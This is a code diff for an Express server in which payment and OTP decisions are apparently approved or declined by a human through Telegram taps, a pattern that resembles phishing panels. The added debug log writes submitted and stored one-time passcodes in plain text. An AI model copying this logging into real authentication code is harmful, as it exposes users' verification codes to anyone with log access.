@@ -197,9 +197,7 @@ app.get('/api/status/:tx', (req, res) => {
 
 /* ============================================================
    POST /api/telegram-webhook — Approve / Decline tap
-   Handles BOTH:
-     - Payment decisions:  approve:TXN-…, decline:TXN-…
-     - OTP decisions:      approve:OTP-TXN-…, decline:OTP-TXN-…
+   Handles BOTH payment and OTP callbacks
 ============================================================ */
 app.post('/api/telegram-webhook', async (req, res) => {
   pushLog('WEBHOOK HIT', 'info');
@@ -384,12 +382,24 @@ app.post('/api/verification/otp', async (req, res) => {
 
 /* ============================================================
    Verification — verify OTP (requires prior Approve in Telegram)
+   Includes VERIFY debug log so mismatches are visible
 ============================================================ */
 app.post('/api/verification/verify', (req, res) => {
   const { tx, otp } = req.body || {};
   if (!tx || !otp) return res.status(400).json({ success: false, message: 'Missing fields' });
 
   const entry = OTP_STORE.get(tx);
+
+  // VERIFY debug line — shows submitted vs stored vs decision
+  pushLog(
+    'VERIFY tx=' + tx +
+    ' submitted=' + otp +
+    ' stored=' + (entry ? entry.code : 'NONE') +
+    ' decision=' + (entry ? entry.decision : 'NONE') +
+    ' attempts=' + (entry ? entry.attempts : '0'),
+    'info'
+  );
+
   if (!entry) return res.status(400).json({ success: false, message: 'Code expired. Please resend.' });
   if (Date.now() > entry.exp) {
     OTP_STORE.delete(tx);
